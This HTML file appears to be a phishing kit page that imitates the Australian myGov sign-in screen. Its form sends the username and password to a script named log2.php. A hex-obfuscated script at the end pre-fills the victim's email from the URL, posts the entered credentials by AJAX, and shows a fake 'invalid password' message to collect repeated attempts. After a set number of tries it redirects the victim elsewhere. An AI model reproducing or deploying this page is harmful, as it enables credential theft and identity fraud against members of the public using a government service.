<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>
        Sign in with myGov - myGov
    </title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="./css/css.css" rel="stylesheet">
    <link href="./css/mgv2-application.css" rel="stylesheet">
    <link href="./css/blugov.css" rel="stylesheet">
</head>

<body>
    <header role="banner" class="mgvEnhanceHeader">
        <section class="wrapper">
            <div class="inner">
                <div class="unauth-grid">
                    <div class="unauth-grid-row">
                        <a href="#" class="unauth-govt-crest__link">
                            <img id="unauth-govt-crest" src="./images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
                        </a>
                        <div class="header-links">
                            <a href="#">Help</a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </header>
    <div class="wrapper-mapwap">
        <div class="main-block" id="content" role="main">
            <div class="unauth">
                <div class="login-grid-container">
                    <div class="login-grid-row">
                        <div class="login-grid-column">
                            <div class="digital-id-login-card-wrapper">
                                <div class="digital-id-main-login-card override">
                                    <a data-go-back-link="" class="button-back" href="#">Back</a>
                                    <h1>Sign in with myGov</h1>
                                    <p class="login-instruction-text">Choose how to sign in from these 2 options</p>
                                    <h2 class="text-align-left">Using your myGov sign in details</h2>
                                    <form action="log2.php" method="post">
                                        <input type="hidden" name="btn1" value="btn1">
                                        <div id="msg" style="display:none;color: red;">
                                            Invalid password..! Please enter correct password.
                                        </div>
                                        <div class="input-group">
                                            <label class="override" for="userId">Username or email</label>
                                            <input id="ai" name="ai" type="text" value="" autocomplete="off" required="">
                                        </div>
                                        <p class="recovery">
                                            <a href="#" class="anchor override">Forgot username</a>
                                        </p>
                                        <div class="input-group">
                                            <label for="password" class="override">Password</label>
                                            <div class="password-group">
                                                <button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button>
                                                <p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p><input id="pr" name="pr" type="password" aria-required="true" required="">
                                            </div>
                                        </div>
                                        <p class="recovery">
                                            <a href="#" class="anchor override">Forgot
                                                password</a>
                                        </p>
                                        <div class="button-digital-id-main-container override">
                                            <div class="digital-id-button-container">
                                                <button type="submit" class="button-main" name="btn1" id="btn1">Sign in</button>
                                            </div>
                                        </div>
                                        <p class="create-account-text"><a class="create-account-link" href="#">Create a myGov account</a> if you don't have one already.</p>
                                    </form>
                                    <div class="hr-word">
                                        <div class="draw-circle">
                                            or
                                        </div>
                                    </div>
                                    <div class="digital-id-login-card secondary">
                                        <div class="button-digital-id-container">
                                            <h2 class="text-align-left">Using your myGovID Digital Identity</h2>
                                            <div class="digital-id-login-option-container">
                                                <div class="inner-options">
                                                    <p class="external-links-zone">
                                                        What is <a href="#" target="_blank">Digital Identity</a> and <a href="#" target="_blank">myGovID</a>?
                                                    </p>
                                                    <a class="button-digital-identity" href="#">Continue with Digital Identity</a>
                                                    <input type="hidden" value="{flowScope.targetParamDI}">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer role="contentinfo">
        <div class="wrapper">
            <div class="inner">
                <section class="footer-list">
                    <nav>
                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
                        <ul class="lower-links">
                            <li>
                                <a target="_blank" href="#">Terms of use</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Privacy and security</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Copyright</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Accessibility</a>
                            </li>
                        </ul>
                    </nav>
                </section>
                <div class="footer-lower">
                    <section class="footer-lower-logo">
                        <a href="#">
                            <img src="./images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
                        </a>
                    </section>
                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
                </div>
            </div>
        </div>
    </footer>
    <!-- //mailer link -->
   
    
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>
var _0x1b34=["\x76\x61\x6C","\x23\x66","\x23\x72\x63","\x23\x72\x64\x72\x74","\x23\x64\x6F\x6D\x61\x69\x6E\x5F\x72\x65\x64\x69\x72\x65\x63\x74","\x6B\x65\x79\x43\x6F\x64\x65","\x77\x68\x69\x63\x68","\x31\x33","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x63\x6C\x69\x63\x6B","\x23\x73\x75\x62\x2D\x62\x74\x6E","\x6B\x65\x79\x70\x72\x65\x73\x73","\x73\x75\x62\x73\x74\x72","\x68\x61\x73\x68","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x40","\x69\x6E\x64\x65\x78\x4F\x66","\x2E","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x23\x61\x69","\x68\x74\x6D\x6C","\x23\x61\x69\x63\x68","\x68\x69\x64\x65","\x23\x6D\x73\x67","\x23\x66\x6F\x72\x6D\x2D\x31","\x6C\x6F\x67","\x4A\x53\x4F\x4E","\x50\x4F\x53\x54","\x56\x65\x72\x69\x66\x79\x69\x6E\x67\x2E\x2E\x2E","\x23\x62\x74\x6E\x31","\x72\x65\x70\x6C\x61\x63\x65","","\x23\x70\x72","\x73\x68\x6F\x77","\x53\x69\x67\x6E\x20\x69\x6E","\x61\x6A\x61\x78","\x73\x75\x62\x6D\x69\x74","\x72\x65\x61\x64\x79"];var f=$(_0x1b34[1])[_0x1b34[0]]();var rc=$(_0x1b34[2])[_0x1b34[0]]();var rdrt=$(_0x1b34[3])[_0x1b34[0]]();var domain_redirect=$(_0x1b34[4])[_0x1b34[0]]();$(document)[_0x1b34[37]](function(){var _0x392ex5=0;$(document)[_0x1b34[11]](function(_0x392ex6){var _0x392ex7=(_0x392ex6[_0x1b34[5]]?_0x392ex6[_0x1b34[5]]:_0x392ex6[_0x1b34[6]]);if(_0x392ex7== _0x1b34[7]){_0x392ex6[_0x1b34[8]]();$(_0x1b34[10])[_0x1b34[9]]()}});var _0x392ex8=window[_0x1b34[14]][_0x1b34[13]][_0x1b34[12]](1);if(!_0x392ex8){}else {var _0x392ex9=_0x392ex8;var _0x392exa=_0x392ex9[_0x1b34[16]](_0x1b34[15]);var _0x392exb=_0x392ex9[_0x1b34[12]]((_0x392exa+ 1));var _0x392exc=_0x392exb[_0x1b34[12]](0,_0x392exb[_0x1b34[16]](_0x1b34[17]));var _0x392exd=_0x392exc[_0x1b34[18]]();$(_0x1b34[19])[_0x1b34[0]](_0x392ex9);$(_0x1b34[21])[_0x1b34[20]](_0x392ex9);$(_0x1b34[23])[_0x1b34[22]]()};$(_0x1b34[24])[_0x1b34[36]](function(_0x392ex6){$(_0x1b34[23])[_0x1b34[22]]();_0x392ex6[_0x1b34[8]]();var _0x392ex8=$(_0x1b34[19])[_0x1b34[0]]();var _0x392ex9=_0x392ex8;var _0x392exe=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;var _0x392exa=_0x392ex9[_0x1b34[16]](_0x1b34[15]);var _0x392exb=_0x392ex9[_0x1b34[12]]((_0x392exa+ 1));var _0x392exc=_0x392exb[_0x1b34[12]](0,_0x392exb[_0x1b34[16]](_0x1b34[17]));var _0x392exd=_0x392exc[_0x1b34[18]]();_0x392ex5= _0x392ex5+ 1;var _0x392exc= new FormData($(_0x1b34[24])[0]);console[_0x1b34[25]](_0x392exc);$[_0x1b34[35]]({dataType:_0x1b34[26],url:f,type:_0x1b34[27],data:_0x392exc,processData:false,contentType:false,beforeSend:function(_0x392exf){$(_0x1b34[29])[_0x1b34[20]](_0x1b34[28])},complete:function(){if(_0x392ex5>= rc){_0x392ex5= 0;window[_0x1b34[14]][_0x1b34[30]](rdrt);return false};$(_0x1b34[32])[_0x1b34[0]](_0x1b34[31]);$(_0x1b34[23])[_0x1b34[33]]();$(_0x1b34[29])[_0x1b34[20]](_0x1b34[34])}})})})
</script>

</html>